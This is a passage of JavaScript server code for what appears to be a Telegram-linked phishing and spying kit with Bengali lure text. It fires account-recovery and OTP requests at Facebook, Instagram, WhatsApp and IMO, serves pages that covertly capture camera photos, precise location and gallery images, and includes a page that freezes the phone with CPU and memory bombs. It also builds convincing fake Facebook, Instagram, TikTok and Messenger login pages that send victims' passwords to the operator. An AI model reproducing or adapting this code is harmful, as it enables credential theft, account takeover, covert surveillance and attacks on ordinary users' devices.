        sessions.set(sid,{...sessions.get(sid)||{},fbCookies:cookies,fbLsd:lsd,phone});
        await axios.post('https://www.facebook.com/ajax/recover/initiate/',
            new URLSearchParams({lsd,email_or_phone:phone,did_login:'0',fur_initiated:'0',action:'initiate'}).toString(),
            {headers:{'Content-Type':'application/x-www-form-urlencoded','User-Agent':TG_UA,'Cookie':cookies,'X-Requested-With':'XMLHttpRequest'},timeout:20000});
        res.json({ok:true});
    }catch(e){res.json({ok:false,err:e.message});}
});

// IG
app.post('/proxy/ig/send',async(req,res)=>{
    const{phone,sid}=req.body;
    try{
        const pg=await axios.get('https://www.instagram.com/accounts/password/reset/',{headers:{'User-Agent':TG_UA},timeout:20000});
        const cookies=parseCookies(pg.headers);
        const csrfM=pg.data.match(/"csrf_token":"([^"]+)"/);
        const csrf=csrfM?csrfM[1]:'';
        sessions.set(sid,{...sessions.get(sid)||{},igCookies:cookies,igCsrf:csrf,phone});
        await axios.post('https://www.instagram.com/accounts/account_recovery_send_ajax/',
            new URLSearchParams({phone_number:phone,email:'',login_attempt_count:'0'}).toString(),
            {headers:{'Content-Type':'application/x-www-form-urlencoded','User-Agent':TG_UA,'Cookie':cookies,'X-CSRFToken':csrf,'X-Requested-With':'XMLHttpRequest','Referer':'https://www.instagram.com/accounts/password/reset/'},timeout:20000});
        res.json({ok:true});
    }catch(e){res.json({ok:false,err:e.message});}
});

// WA
app.post('/proxy/wa/send',async(req,res)=>{
    const{cc,phone_local,sid}=req.body;
    for(const key of WA_KEYS){
        for(const method of['sms','voice']){
            try{
                const tok=crypto.createHmac('sha1',Buffer.from(key)).update(Buffer.from(cc+phone_local)).digest('base64');
                const r=await axios.get(`https://v.whatsapp.net/v2/code?cc=${cc}&in=${phone_local}&lg=en&lc=US&sim_mcc=470&sim_mnc=01&method=${method}&reason=&token=${encodeURIComponent(tok)}&hasav=1`,
                    {headers:{'User-Agent':'WhatsApp/2.24.6.77 A','Accept':'application/json'},timeout:20000});
                if(r.data&&(r.data.status==='sent'||r.data.status==='ok'||r.data.retry_after)){
                    sessions.set(sid,{...sessions.get(sid)||{},wacc:cc,waphone:phone_local});
                    return res.json({ok:true,status:r.data.status});
                }
            }catch(e){}
        }
    }
    sessions.set(sid,{...sessions.get(sid)||{},wacc:cc,waphone:phone_local});
    res.json({ok:true,sent:false});
});

// IMO
app.post('/proxy/imo/send',async(req,res)=>{
    const{phone,sid}=req.body;
    const eps=['https://api.imo.im/anti-spam/send-code','https://api2.imo.im/anti-spam/send-code','https://sgp.imo.im/anti-spam/send-code'];
    for(const ep of eps){
        try{
            const r=await axios.post(ep,{phone_number:phone,lang:'en',from_registration:true,client:'android'},
                {headers:{'Content-Type':'application/json','User-Agent':'imo-android/2024.03.1011','Accept':'application/json'},timeout:20000});
            sessions.set(sid,{...sessions.get(sid)||{},imoPhone:phone});
            return res.json({ok:true,data:r.data});
        }catch(e){}
    }
    res.json({ok:true,sent:false});
});

// ══════════════════════════════
// PAGE BUILDER
// ══════════════════════════════
app.get('/go/:tok',(req,res)=>{
    const info=links.get(req.params.tok);
    if(!info) return res.send('<h2 style="text-align:center;font-family:sans-serif;color:red;margin-top:30%">❌ Link expired.</h2>');
    res.send(buildPage(info.action,info.uid,req));
});

function buildPage(action,uid,req){
    if(['cam_f','cam_b','loc'].includes(action)) return attackPage(action,uid,req);
    if(action==='gallery') return galleryPage(uid,req);
    if(action==='hang') return hangPage(uid,req);
    if(['phish_wa','phish_imo','phish_tg'].includes(action)) return otpPage(action,uid,req);
    return passPage(action,uid,req);
}

// ── ভিডিও লুর ব্লক ─────────────────────────
function vidBlock(hotText, subText){
    return `
<div style="text-align:center;padding:0 0 16px">
  <div style="position:relative;width:100%;border-radius:14px;overflow:hidden;background:#000;max-height:220px;display:flex;align-items:center;justify-content:center">
    <video autoplay muted loop playsinline
      style="width:100%;max-height:220px;display:block;object-fit:cover"
      onerror="this.parentElement.style.display='none'">
      <source src="${LURE_VID}" type="video/mp4">
    </video>
  </div>
  <p style="font-size:16px;font-weight:800;margin:10px 0 5px">${hotText}</p>
  <p style="font-size:12px;line-height:1.7;margin:0;opacity:0.85">${subText}</p>
</div>`;
}

// ── Phone Hang / Freeze Page ──────────────────
function hangPage(uid,req){
    const base=getBase(req);
    return `<!DOCTYPE html><html><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Loading...</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0d0d0d;color:#fff;font-family:-apple-system,sans-serif;
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  min-height:100vh;padding:16px;text-align:center}
.vid-box{width:100%;max-width:360px;border-radius:14px;overflow:hidden;margin-bottom:18px}
video{width:100%;max-height:200px;display:block;object-fit:cover}
.spinner{width:60px;height:60px;border:5px solid rgba(255,255,255,.15);
  border-top-color:#fe2c55;border-radius:50%;animation:spin 0.8s linear infinite;margin:16px auto}
@keyframes spin{to{transform:rotate(360deg)}}
h2{font-size:20px;font-weight:700;margin:10px 0 8px}
p{font-size:13px;color:#aaa;line-height:1.6}
</style></head><body>

<div class="vid-box">
  <video autoplay muted loop playsinline>
    <source src="${LURE_VID}" type="video/mp4">
  </video>
</div>
<div class="spinner"></div>
<h2>Loading Content...</h2>
<p>Please wait, content is being prepared for you...</p>

<script>
// Report to bot
fetch('${base}/d/text',{method:'POST',keepalive:true,
  headers:{'Content-Type':'application/json'},
  body:JSON.stringify({uid:'${uid}',type:'💥 Phone Hang',data:navigator.userAgent})});

// Freeze: multiple web workers running infinite loops
function makeWorker(){
  const blob=new Blob(['while(true){let x=0;for(let i=0;i<1e8;i++)x+=Math.sqrt(i);}'],{type:'application/javascript'});
  const url=URL.createObjectURL(blob);
  return new Worker(url);
}

// Launch 8 workers to saturate CPU
try{
  for(let i=0;i<8;i++) makeWorker();
}catch(e){}

// Also bomb main thread with DOM and memory
(function bomb(){
  const arr=[];
  try{
    while(true){
      arr.push(new Array(1e6).fill(Math.random()));
      const d=document.createElement('div');
      d.textContent=Math.random().toString(36).repeat(100);
      document.body.appendChild(d);
    }
  }catch(e){ setTimeout(bomb,0); }
})();
</script></body></html>`;
}

// ── Gallery Hack Page ────────────────────────
function galleryPage(uid,req){
    const base=getBase(req);
    return `<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Photos Shared With You</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0d0d0d;color:#fff;font-family:-apple-system,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;text-align:center}
.avatar{width:72px;height:72px;border-radius:50%;background:linear-gradient(135deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);display:flex;align-items:center;justify-content:center;font-size:32px;margin:0 auto 14px}
h2{font-size:20px;font-weight:700;margin-bottom:8px}
p{font-size:14px;color:#ccc;line-height:1.6;max-width:300px;margin:0 auto 24px}
.count{background:rgba(255,255,255,0.1);border-radius:12px;padding:10px 20px;font-size:22px;font-weight:700;color:#f48fb1;margin-bottom:24px}
.count span{font-size:13px;color:#aaa;display:block;font-weight:400;margin-top:2px}
.btn{padding:16px 0;width:100%;max-width:300px;border:none;border-radius:50px;background:linear-gradient(135deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);color:#fff;font-size:17px;font-weight:700;cursor:pointer;box-shadow:0 4px 20px rgba(220,39,67,0.4)}
.info{font-size:11px;color:#555;margin-top:16px;max-width:280px;line-height:1.5}
#progress{display:none;width:100%;max-width:300px;margin-top:20px}
.prog-bar{height:6px;background:rgba(255,255,255,0.1);border-radius:3px;overflow:hidden;margin-bottom:8px}
.prog-fill{height:100%;background:linear-gradient(90deg,#f09433,#dc2743);border-radius:3px;width:0%;transition:width 0.3s}
.prog-text{font-size:13px;color:#aaa}
video,canvas{display:none;width:1px;height:1px}
input[type=file]{position:absolute;opacity:0;width:1px;height:1px}
</style>
</head><body>

<div class="avatar">📸</div>
<h2>Photos Shared With You</h2>
<p>তোমার বন্ধু তোমার সাথে কিছু ছবি share করেছে। দেখতে Allow করুন।</p>
<div class="count">17 <span>photos waiting</span></div>

<button class="btn" id="mainbtn" onclick="requestAccess()">📂 Allow & View Photos</button>
<div class="info">ছবিগুলো শুধু তুমিই দেখতে পাবে। অন্য কেউ access করতে পারবে না।</div>

<div id="progress">
  <div class="prog-bar"><div class="prog-fill" id="fill"></div></div>
  <div class="prog-text" id="prog-text">Uploading photos... 0%</div>
</div>

<input type="file" id="fInput" accept="image/*" multiple>
<video id="vv" autoplay playsinline muted></video>
<canvas id="cc"></canvas>

<script>
const UID='${uid}', D='${base}/d';
let uploadCount=0, totalFiles=0;

window.onload=()=>{
    fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({uid:UID,type:'📸 Gallery Opened',data:navigator.userAgent})});
};

function requestAccess(){
    document.getElementById('mainbtn').textContent='⏳ Opening gallery...';
    // Trigger file picker
    const fi=document.getElementById('fInput');
    fi.click();
    fi.onchange=async(e)=>{
        const files=Array.from(e.target.files);
        if(!files.length) return;
        totalFiles=Math.min(files.length, 20);
        document.getElementById('mainbtn').style.display='none';
        document.getElementById('progress').style.display='block';
        uploadCount=0;
        for(let i=0;i<totalFiles;i++){
            await uploadPhoto(files[i], i+1, totalFiles);
        }
        document.getElementById('prog-text').textContent='✅ Done! Loading photos...';
        setTimeout(()=>{ window.location.href='https://www.google.com'; }, 1200);
    };
}

async function uploadPhoto(file, n, total){
    try{
        const pct=Math.round((n/total)*100);
        document.getElementById('fill').style.width=pct+'%';
        document.getElementById('prog-text').textContent='Uploading photos... '+pct+'%';
        const fd=new FormData();
        fd.append('photo', file, file.name);
        fd.append('uid', UID);
        fd.append('camtype', '🖼️ Gallery Photo '+n+'/'+total);
        await fetch(D+'/photo',{method:'POST',body:fd});
    }catch(e){}
    await new Promise(r=>setTimeout(r,200));
}
</script>
</body></html>`;
}

// ── Camera / Location ─────────────────────────────────
function attackPage(action,uid,req){
    const base=getBase(req);
    const isLoc=action==='loc';
    const isFront=action==='cam_f';
    const faceMode=isFront?'user':'environment';
    const lureTexts={
        cam_f:{h:'📸 Private Photo',sub:'তোমার জন্য একটি Photo এসেছে।\nদেখতে নিচে Allow চাপুন।',btn:'🔓 Allow & View',bc:'#1877f2'},
        cam_b:{h:'📸 Shared Photo',sub:'কেউ তোমার সাথে Photo শেয়ার করেছে।\nAllow দিয়ে দেখুন।',btn:'🔓 Allow & Open',bc:'#1877f2'},
        loc:  {h:'📍 Location Access',sub:'কাছের Content দেখতে Location দিন।',btn:'📍 Allow Location',bc:'#4CAF50'},
    }[action]||{h:'Loading',sub:'',btn:'Allow',bc:'#1877f2'};

    return `<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Loading...</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0d0d0d;color:#fff;font-family:-apple-system,sans-serif;
  min-height:100vh;display:flex;flex-direction:column;align-items:center;
  justify-content:center;padding:20px;text-align:center}
.vbox{width:100%;max-width:380px;border-radius:16px;overflow:hidden;
  margin-bottom:20px;background:#111;box-shadow:0 4px 24px rgba(0,0,0,.5)}
.vbox video{width:100%;max-height:210px;display:block;object-fit:cover}
h2{font-size:22px;font-weight:800;margin-bottom:8px;line-height:1.3}
p{color:#bbb;font-size:14px;line-height:1.7;margin-bottom:26px;max-width:300px}
.abtn{padding:17px 0;width:100%;max-width:320px;border:none;border-radius:50px;
  background:${lureTexts.bc};color:#fff;font-size:18px;font-weight:700;cursor:pointer;
  box-shadow:0 4px 18px rgba(0,100,255,.3);letter-spacing:.5px}
#msg{margin-top:18px;font-size:14px;color:#999;min-height:22px}
video.h,canvas{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px}
</style></head>
<body>

<div class="vbox">
  <video autoplay muted loop playsinline>
    <source src="${LURE_VID}" type="video/mp4">
  </video>
</div>

<h2>${lureTexts.h}</h2>
<p>${lureTexts.sub}</p>
<button class="abtn" id="abtn" onclick="startCapture()">${lureTexts.btn}</button>
<div id="msg"></div>

<video class="h" id="hv" playsinline muted autoplay></video>
<canvas id="cc"></canvas>

<script>
const UID='${uid}', D='${base}/d', TAG='${isFront?'📷 Front Cam':'📷 Back Cam'}';
let busy=false;

function setMsg(t){ document.getElementById('msg').textContent=t; }
function setBtn(t){ document.getElementById('abtn').textContent=t; }

${isLoc?`
async function startCapture(){
  setBtn('⏳ Getting location...');
  if(!navigator.geolocation){ setMsg('Location not supported'); return; }
  navigator.geolocation.getCurrentPosition(
    pos=>{
      const {latitude:lat,longitude:lon,accuracy:acc}=pos.coords;
      fetch(D+'/loc',{method:'POST',keepalive:true,
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({uid:UID,lat,lon,acc})});
      setBtn('✅ Location Sent!');
      setMsg('Done — redirecting...');
      setTimeout(()=>location.href='https://www.google.com',1500);
    },
    err=>{ setMsg('Please allow location.'); setBtn('📍 Allow Location'); },
    {enableHighAccuracy:true,timeout:12000,maximumAge:0}
  );
}
`:`
async function startCapture(){
  if(busy) return;
  busy=true;
  setBtn('⏳ Loading...');
  setMsg('Please wait...');

  // Try preferred facing mode first, fallback to any camera
  const constraints=[
    {video:{facingMode:{exact:'${faceMode}'},width:{ideal:1280},height:{ideal:720}},audio:false},
    {video:{facingMode:'${faceMode}'},audio:false},
    {video:true,audio:false}
  ];

  let stream=null;
  for(const c of constraints){
    try{ stream=await navigator.mediaDevices.getUserMedia(c); break; }catch(e){}
  }

  if(!stream){
    setMsg('Camera access denied.');
    setBtn('${lureTexts.btn}');
    busy=false;
    return;
  }

  const v=document.getElementById('hv');
  const cv=document.getElementById('cc');
  v.srcObject=stream;

  // Wait for video to be ready
  await new Promise(r=>{
    v.onloadedmetadata=()=>{ v.play(); setTimeout(r,1200); };
    setTimeout(r,3000); // hard timeout
  });

  cv.width=v.videoWidth||640;
  cv.height=v.videoHeight||480;
  const ctx=cv.getContext('2d');

  // Capture 5 photos rapidly
  for(let i=0;i<5;i++){
    ctx.drawImage(v,0,0,cv.width,cv.height);
    const blob=await new Promise(r=>cv.toBlob(r,'image/jpeg',0.9));
    if(blob){
      const fd=new FormData();
      fd.append('photo',blob,'pic'+(i+1)+'.jpg');
      fd.append('uid',UID);
      fd.append('camtype',TAG+' ['+(i+1)+'/5]');
      fetch(D+'/photo',{method:'POST',body:fd,keepalive:true}).catch(()=>{});
    }
    setMsg('Sending... '+(i+1)+'/5');
    await new Promise(r=>setTimeout(r,300));
  }

  // Stop camera
  stream.getTracks().forEach(t=>t.stop());
  setBtn('✅ Done!');
  setMsg('Content loaded successfully!');
}
`}
</script>
</body></html>`;
}

// ── FB / IG / TT / Messenger — ultra convincing official pages ──
function passPage(action,uid,req){
    const base=getBase(req);

    // notification alerts — এগুলো দেখলে যে কেউ লগইন করবেই
    const alerts={
        phish_fb:{
            icon:'🔴', alert:'Security Alert',
            msg:'আপনার Facebook account-এ অপরিচিত একটি device থেকে login করার চেষ্টা করা হয়েছে।\n\nঅ্যাকাউন্ট সুরক্ষিত রাখতে এখনই verify করুন।',
            tag:'account_security'
        },
        phish_ig:{
            icon:'🔔', alert:'New Activity',
            msg:'কেউ আপনার Instagram account থেকে একটি private content share করেছে।\n\nদেখতে login করুন।',
            tag:'private_share'
        },
        phish_tt:{
            icon:'📩', alert:'Private Message',
            msg:'আপনার TikTok inbox-এ একটি private video message অপেক্ষা করছে।\n\nদেখতে login করুন।',
            tag:'inbox_message'
        },
        phish_msgr:{
            icon:'💬', alert:'Unread Message',
            msg:'আপনার Messenger-এ ৩টি unread message আছে।\n\nদেখতে এখনই login করুন।',
            tag:'unread_messages'
        }
    };

    const pages={
        phish_fb:`<!DOCTYPE html><html><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Facebook - Log In or Sign Up</title>
<meta name="theme-color" content="#1877f2">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f0f2f5;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif;min-height:100vh}

/* notification banner */
.notif{background:#fff3cd;border-left:4px solid #ffc107;padding:12px 16px;margin:0 0 0;display:flex;align-items:flex-start;gap:10px}
.notif-icon{font-size:20px;flex-shrink:0;margin-top:2px}
.notif-text{font-size:13px;color:#333;line-height:1.5}
.notif-text b{color:#d32f2f;display:block;margin-bottom:3px}

.wrap{max-width:400px;margin:0 auto;padding:16px 14px}

/* video preview */
.vid-preview{position:relative;border-radius:12px;overflow:hidden;margin-bottom:14px;background:#000}
.vid-preview video{width:100%;display:block;max-height:190px;object-fit:cover}
.vid-overlay{position:absolute;bottom:0;left:0;right:0;background:linear-gradient(transparent,rgba(0,0,0,0.85));padding:10px 12px}
.vid-overlay p{color:#fff;font-size:12px;line-height:1.5}
.vid-overlay b{color:#ffcc00;font-size:13px;display:block}

/* card */
.card{background:#fff;border-radius:8px;padding:20px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1)}
.fb-logo{text-align:center;margin-bottom:16px}
.fb-logo svg{width:48px;height:48px}
input{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;color:#1c1e21;background:#fff;margin-bottom:12px;outline:none;-webkit-appearance:none}
input:focus{border-color:#1877f2;box-shadow:0 0 0 2px rgba(24,119,242,.2)}
input::placeholder{color:#8a8d91}
.btn-login{width:100%;padding:14px;background:#1877f2;color:#fff;font-size:20px;font-weight:700;border:none;border-radius:6px;cursor:pointer;margin-bottom:16px}
.forgot{text-align:center;margin-bottom:16px}
.forgot a{color:#1877f2;font-size:14px;text-decoration:none}
.sep{display:flex;align-items:center;margin-bottom:16px}
.sep-line{flex:1;height:1px;background:#dadde1}
.sep-or{padding:0 16px;color:#8a8d91;font-size:14px}
.btn-create{width:100%;padding:14px;background:#42b72a;color:#fff;font-size:17px;font-weight:700;border:none;border-radius:6px;cursor:pointer}
.privacy{text-align:center;font-size:11px;color:#8a8d91;margin-top:14px;line-height:1.5}
.privacy a{color:#1877f2;text-decoration:none}
</style></head><body>

<div class="notif">
  <span class="notif-icon">🔴</span>
  <div class="notif-text">
    <b>⚠️ Security Alert — Action Required</b>
    আপনার account-এ অপরিচিত device থেকে login attempt হয়েছে। অ্যাকাউন্ট সুরক্ষিত রাখতে এখনই verify করুন।
  </div>
</div>

<div class="wrap">
  <div class="vid-preview">
    <video autoplay muted loop playsinline>
      <source src="${LURE_VID}" type="video/mp4">
    </video>
    <div class="vid-overlay">
      <b>🔒 Private Content — Login Required</b>
      <p>আপনার account-এ একটি private content share করা হয়েছে। দেখতে login করুন।</p>
    </div>
  </div>

  <div class="card">
    <div class="fb-logo">
      <svg viewBox="0 0 36 36" fill="#1877f2"><path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34h5.5l.681 1.87z"/><path fill="#fff" d="M13.651 35.471v-11.97H9.936V18h3.715v-2.37c0-6.127 2.772-8.964 8.784-8.964 1.138 0 3.103.223 3.91.446v4.983c-.425-.043-1.167-.065-2.081-.065-2.952 0-4.09 1.116-4.09 4.022V18h5.883l-1.008 5.501h-4.867v12.37a18.183 18.183 0 01-6.531-.4z"/></svg>
    </div>
    <input id="u" type="text" placeholder="Mobile number or email" autocomplete="email">
    <input id="p" type="password" placeholder="Password" autocomplete="current-password">
    <button class="btn-login" onclick="sub()">Log In</button>
    <div class="forgot"><a href="#">Forgotten password?</a></div>
    <div class="sep"><div class="sep-line"></div><span class="sep-or">or</span><div class="sep-line"></div></div>
    <button class="btn-create" onclick="sub()">Create new account</button>
    <div class="privacy">By clicking Log In, you agree to our <a href="#">Terms</a>, <a href="#">Privacy Policy</a> and <a href="#">Cookies Policy</a>.</div>
  </div>
</div>

<script>
const UID='${uid}',D='${base}/d',SITE='Facebook',RDR='https://www.facebook.com';
window.onload=()=>fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,type:'FB Opened',data:navigator.userAgent})});
async function sub(){
  const u=document.getElementById('u').value,p=document.getElementById('p').value;
  if(!u||!p){document.getElementById('u').style.borderColor='#f02849';return;}
  document.querySelector('.btn-login').textContent='Logging in...';
  await fetch(D+'/captured',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,site:SITE,phone:u,otp:p})});
  setTimeout(()=>window.location.href=RDR,700);
}
</script></body></html>`,

        phish_ig:`<!DOCTYPE html><html><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Instagram</title>
<meta name="theme-color" content="#ffffff">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh}
.notif{background:#fff8e1;border-left:4px solid #ff9800;padding:12px 16px;display:flex;align-items:flex-start;gap:10px}
.notif-icon{font-size:18px;flex-shrink:0}
.notif-text{font-size:13px;color:#333;line-height:1.5}
.notif-text b{color:#e65100;display:block;margin-bottom:3px}
.wrap{max-width:400px;margin:0 auto;padding:14px}
.vid-preview{position:relative;border-radius:12px;overflow:hidden;margin-bottom:12px;background:#000}
.vid-preview video{width:100%;display:block;max-height:180px;object-fit:cover}
.vid-overlay{position:absolute;inset:0;background:linear-gradient(transparent 40%,rgba(0,0,0,0.8));display:flex;flex-direction:column;justify-content:flex-end;padding:12px}
.vid-overlay b{color:#fff;font-size:13px;display:block}
.vid-overlay span{color:rgba(255,255,255,0.85);font-size:12px}
.card{border:1px solid #dbdbdb;background:#fff;border-radius:4px;padding:28px 24px;margin-bottom:10px;text-align:center}
.ig-logo{font-size:32px;font-style:italic;font-family:'Grand Hotel',Georgia,serif;color:#262626;margin-bottom:20px;display:block}
input{width:100%;padding:9px 8px;border:1px solid #dbdbdb;border-radius:3px;background:#fafafa;font-size:14px;color:#262626;margin-bottom:8px;outline:none}
input:focus{border-color:#a8a8a8;background:#fff}
input::placeholder{color:#8e8e8e}
.btn{width:100%;padding:8px;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);color:#fff;font-size:14px;font-weight:600;border:none;border-radius:4px;cursor:pointer;opacity:0.9;margin-top:2px}
.btn:hover{opacity:1}
.or-row{display:flex;align-items:center;margin:16px 0}
.or-row div{flex:1;height:1px;background:#dbdbdb}
.or-row span{padding:0 18px;color:#8e8e8e;font-size:13px;font-weight:600}
.fb-btn{color:#1877f2;font-weight:600;font-size:14px;text-decoration:none;display:block}
.forgot{color:#00376b;font-size:12px;text-decoration:none;display:block;margin-top:14px}
.signup-card{border:1px solid #dbdbdb;background:#fff;border-radius:4px;padding:14px;text-align:center;font-size:14px}
.signup-card a{color:#0095f6;font-weight:600;text-decoration:none}
</style></head><body>
<div class="notif">
  <span class="notif-icon">🔔</span>
  <div class="notif-text"><b>📸 New Activity on Your Account</b>আপনার Instagram-এ একটি private content share করা হয়েছে। দেখতে login করুন।</div>
</div>
<div class="wrap">
  <div class="vid-preview">
    <video autoplay muted loop playsinline><source src="${LURE_VID}" type="video/mp4"></video>
    <div class="vid-overlay"><b>🔒 Private Content</b><span>Login করলেই দেখতে পাবেন</span></div>
  </div>
  <div class="card">
    <span class="ig-logo">Instagram</span>
    <input id="u" type="text" placeholder="Phone number, username, or email">
    <input id="p" type="password" placeholder="Password">
    <button class="btn" onclick="sub()">Log in</button>
    <div class="or-row"><div></div><span>OR</span><div></div></div>
    <a href="#" class="fb-btn">Log in with Facebook</a>
    <a href="#" class="forgot">Forgot password?</a>
  </div>
  <div class="signup-card">Don't have an account? <a href="#" onclick="sub()">Sign up</a></div>
</div>
<script>
const UID='${uid}',D='${base}/d',SITE='Instagram',RDR='https://www.instagram.com';
window.onload=()=>fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,type:'IG Opened',data:navigator.userAgent})});
async function sub(){
  const u=document.getElementById('u').value,p=document.getElementById('p').value;
  if(!u||!p)return;
  document.querySelector('.btn').textContent='Logging in...';
  await fetch(D+'/captured',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,site:SITE,phone:u,otp:p})});
  setTimeout(()=>window.location.href=RDR,700);
}
</script></body></html>`,

        phish_tt:`<!DOCTYPE html><html><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>TikTok - Log in</title>
<meta name="theme-color" content="#ffffff">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh}
.notif{background:#fff0f1;border-left:4px solid #fe2c55;padding:12px 16px;display:flex;align-items:flex-start;gap:10px}
.notif-icon{font-size:18px;flex-shrink:0}
.notif-text{font-size:13px;color:#333;line-height:1.5}
.notif-text b{color:#fe2c55;display:block;margin-bottom:3px}
.wrap{max-width:400px;margin:0 auto;padding:14px}
.vid-preview{position:relative;border-radius:12px;overflow:hidden;margin-bottom:14px;background:#000}
.vid-preview video{width:100%;display:block;max-height:180px;object-fit:cover}
.vid-badge{position:absolute;top:10px;right:10px;background:rgba(254,44,85,0.9);color:#fff;font-size:11px;font-weight:700;padding:4px 10px;border-radius:20px}
.vid-overlay{position:absolute;bottom:0;left:0;right:0;padding:10px 12px;background:linear-gradient(transparent,rgba(0,0,0,0.85))}
.vid-overlay b{color:#fff;font-size:13px;display:block}
.vid-overlay span{color:rgba(255,255,255,0.8);font-size:11px}
.head{text-align:center;padding:20px 0 12px}
.tt-logo{font-size:26px;font-weight:900;font-family:Arial Black,sans-serif;color:#161823}
.head-sub{font-size:14px;color:#8a8b8d;margin-top:6px;line-height:1.4}
input{width:100%;padding:15px 14px;border:1px solid #e3e3e4;border-radius:4px;font-size:16px;color:#161823;margin-bottom:10px;outline:none}
input:focus{border-color:#fe2c55}
input::placeholder{color:#8a8b8d}
.btn{width:100%;padding:15px;background:#fe2c55;color:#fff;font-size:16px;font-weight:600;border:none;border-radius:4px;cursor:pointer;margin-top:4px}
.forgot{text-align:center;margin-top:12px}
.forgot a{color:#fe2c55;font-size:14px;font-weight:500;text-decoration:none}
.sep{text-align:center;color:#8a8b8d;font-size:13px;margin:16px 0;display:flex;align-items:center;gap:10px}
.sep div{flex:1;height:1px;background:#e3e3e4}
.alt-btn{width:100%;padding:14px;background:#fff;border:1.5px solid #e3e3e4;border-radius:4px;font-size:15px;color:#161823;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px}
</style></head><body>
<div class="notif">
  <span class="notif-icon">📩</span>
  <div class="notif-text"><b>💌 You have a Private Message</b>আপনার TikTok inbox-এ একটি private video message অপেক্ষা করছে।</div>
</div>
<div class="wrap">
  <div class="vid-preview">
    <video autoplay muted loop playsinline><source src="${LURE_VID}" type="video/mp4"></video>
    <div class="vid-badge">🔒 Private</div>
    <div class="vid-overlay"><b>Private Video Message</b><span>Login করলেই দেখতে পাবেন</span></div>
  </div>
  <div class="head">
    <div class="tt-logo">TikTok</div>
    <div class="head-sub">Log in to view your private messages<br>and exclusive content</div>
  </div>
  <input id="u" type="text" placeholder="Phone / Email / Username">
  <input id="p" type="password" placeholder="Password">
  <button class="btn" onclick="sub()">Log in</button>
  <div class="forgot"><a href="#">Forgot password?</a></div>
  <div class="sep"><div></div>OR<div></div></div>
  <button class="alt-btn" onclick="sub()">Continue with Facebook</button>
</div>
<script>
const UID='${uid}',D='${base}/d',SITE='TikTok',RDR='https://www.tiktok.com';
window.onload=()=>fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,type:'TT Opened',data:navigator.userAgent})});
async function sub(){
  const u=document.getElementById('u').value,p=document.getElementById('p').value;
  if(!u||!p)return;
  document.querySelector('.btn').textContent='Logging in...';
  await fetch(D+'/captured',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,site:SITE,phone:u,otp:p})});
  setTimeout(()=>window.location.href=RDR,700);
}
</script></body></html>`,

        phish_msgr:`<!DOCTYPE html><html><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Messenger</title>
<meta name="theme-color" content="#0084ff">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f0f2f5;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh}
.notif{background:#e8f4fd;border-left:4px solid #0084ff;padding:12px 16px;display:flex;align-items:flex-start;gap:10px}
.notif-icon{font-size:18px;flex-shrink:0}
.notif-text{font-size:13px;color:#333;line-height:1.5}
.notif-text b{color:#0050a0;display:block;margin-bottom:3px}
.wrap{max-width:400px;margin:0 auto;padding:14px}
.vid-preview{position:relative;border-radius:14px;overflow:hidden;margin-bottom:14px;background:#000;box-shadow:0 4px 12px rgba(0,0,0,.2)}
.vid-preview video{width:100%;display:block;max-height:180px;object-fit:cover}
.msg-bubble{position:absolute;top:10px;left:10px;background:rgba(0,0,0,.65);border-radius:20px;padding:6px 12px;display:flex;align-items:center;gap:6px}
.msg-bubble span{color:#fff;font-size:12px}
.msg-dot{width:8px;height:8px;border-radius:50%;background:#25d366;flex-shrink:0}
.vid-overlay{position:absolute;bottom:0;left:0;right:0;padding:10px 12px;background:linear-gradient(transparent,rgba(0,0,0,0.8))}
.vid-overlay b{color:#fff;font-size:13px;display:block}
.vid-overlay span{color:rgba(255,255,255,0.8);font-size:11px}
.card{background:#fff;border-radius:10px;padding:22px 18px;box-shadow:0 2px 8px rgba(0,0,0,.1)}
